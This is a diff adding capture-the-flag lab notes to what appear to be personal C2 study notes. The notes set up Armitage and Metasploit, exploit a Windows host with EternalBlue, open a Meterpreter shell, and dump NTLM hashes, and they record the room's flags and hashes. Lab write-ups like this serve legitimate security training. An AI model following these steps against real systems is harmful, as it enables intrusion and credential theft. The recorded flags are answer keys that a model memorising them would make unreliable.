@@ -108,3 +108,44 @@ Standard: TCP or UDP
 HTTP/HTTPS: firewall with protocol inspection, Domain fronting or malleable c2 profiles
 DNS: device that cannont easily access internet; - https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf
 SMB: flexible pivoting, accessing restricted network segment
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+AttackBox
+
+1. Setup
+systemctl start postgresql && systemctl status postgresql
+su ubuntu
+msfdb --use-defaults delete
+msfdb --use-defaults init
+cd /opt/armitage/release/unix
+./teamserver [yourAttackBoxIP] [password] - (returns info)
+./armitage (enter info returned above)
+
+2. Scan
+Hosts > Nmap Scan > Quick Scan > [IP Ted-PC/32]
+
+3. Exploit
+exploit > windows > smb > ms17_010_eternalblue
+
+4. Post Exploit
+post > multi > manage > shell_to_meterpreter 
+
+Meterpreter shell - right click > Meterpreter 2  > Interact > Meterpreter Shell
+cd /users/
+cd Administartor/Desktop
+cat root.txt > flag#1
+THM{bd6ea6c871dced619876321081132744}
+
+cd /users/Ted/Desktop
+cat user.txt > flag#3
+THM{217fa45e35f8353ffd04cfc0be28e760}
+
+Dump Hashes > right click > Meterpreter 2 > Access > Dump Hashes > Registry method
+Administartor NTLM Hash flag#2: c1565d108721c5626a6a054d6e0943c
+Ted NTLM Hash flag#4: 2e2618f266da8867e5664425c1309a5c
+
+
+
+
+
